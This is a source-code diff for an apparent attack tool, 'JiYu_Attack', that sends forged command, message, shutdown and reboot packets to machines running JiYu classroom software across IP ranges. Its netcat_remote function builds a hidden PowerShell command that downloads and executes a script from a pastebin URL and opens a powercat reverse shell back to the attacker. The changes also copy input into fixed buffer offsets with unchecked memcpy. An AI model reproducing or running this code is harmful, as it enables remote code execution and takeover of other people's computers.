@@ -12,8 +12,10 @@
 #pragma warning(disable:4530)
 #endif // _MSC_VER
 
-JiYu_Attack::JiYu_Attack(): logger(stdout), client(logger) {
-    logger.setLevel(Logger::IERROR);
+JiYu_Attack::JiYu_Attack() {
+    logger = new Logger(stdout);
+    logger->setLevel(Logger::IERROR);
+    client = new ISocket(logger);
 }
 
 const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
@@ -121,6 +123,8 @@ const std::vector<BYTE> JiYu_Attack::cmdCodePrefix[4] = {
     },
 };
 
+const int JiYu_Attack::cmdContentBegin[2] = {56, 578};
+
 const std::string JiYu_Attack::nc_ps_url = "https://pastebin.com/raw/u7zARPaN";
 
 std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
@@ -149,17 +153,21 @@ std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
         }
         return ret;
     }
-    logger.log(Logger::IERROR, "非法的 IP 地址格式。");
+    logger->log(Logger::IERROR, "非法的 IP 地址格式。");
     return ret;
 }
 
 int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
     int ret = 0;
     auto data = cmdCodePrefix[CMD];
-    data.insert(data.end(), cmd.begin(), cmd.end());
+#ifdef _MSC_VER
+    memcpy_s(&data[cmdContentBegin[CMD]], (data.size() - cmdContentBegin[CMD]) * sizeof(BYTE), &cmd[0], cmd.size() * sizeof(BYTE));
+#else
+    memcpy(&data[cmdContentBegin[CMD]], &cmd[0], cmd.size() * sizeof(BYTE));
+#endif
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
-        ret |= client.send(IP, port, data);
+        ret |= client->send(IP, port, data);
     }
     return ret;
 }
@@ -167,10 +175,14 @@ int JiYu_Attack::sendCmd(std::string rawIP, int port, std::string cmd) {
 int JiYu_Attack::sendMsg(std::string rawIP, int port, std::string msg) {
     int ret = 0;
     auto data = cmdCodePrefix[MSG];
-    data.insert(data.end(), msg.begin(), msg.end());
+#ifdef _MSC_VER
+    memcpy_s(&data[cmdContentBegin[MSG]], (data.size() - cmdContentBegin[MSG]) * sizeof(BYTE), &msg[0], msg.size() * sizeof(BYTE));
+#else
+    memcpy(&data[cmdContentBegin[MSG]], &msg[0], msg.size() * sizeof(BYTE));
+#endif
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
-        ret |= client.send(IP, port, data);
+        ret |= client->send(IP, port, data);
     }
     return ret;
 }
@@ -180,7 +192,7 @@ int JiYu_Attack::sendShutdown(std::string rawIP, int port) {
     auto data = cmdCodePrefix[SHUTDOWN];
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
-        ret |= client.send(IP, port, data);
+        ret |= client->send(IP, port, data);
     }
     return ret;
 }
@@ -190,7 +202,7 @@ int JiYu_Attack::sendReboot(std::string rawIP, int port) {
     auto data = cmdCodePrefix[SHUTDOWN];
     auto IPs = IPParser(rawIP);
     for(auto IP: IPs) {
-        ret |= client.send(IP, port, data);
+        ret |= client->send(IP, port, data);
     }
     return ret;
 }
@@ -208,7 +220,7 @@ DWORD WINAPI netcat_remote(LPVOID lpParameter) {
         ncInfo.IP,
         ncInfo.port,
         "powershell -WindowStyle Hidden IEX (New-Object System.Net.Webclient).DownloadString('" + JiYu_Attack::nc_ps_url +
-        "');powercat -c " + ncInfo.jyAtk->client.localIP + " -p " + std::to_string(ncInfo.ncport) + " -e cmd"
+        "');powercat -c " + ncInfo.jyAtk->client->localIP + " -p " + std::to_string(ncInfo.ncport) + " -e cmd"
     );
     return 0;
 }
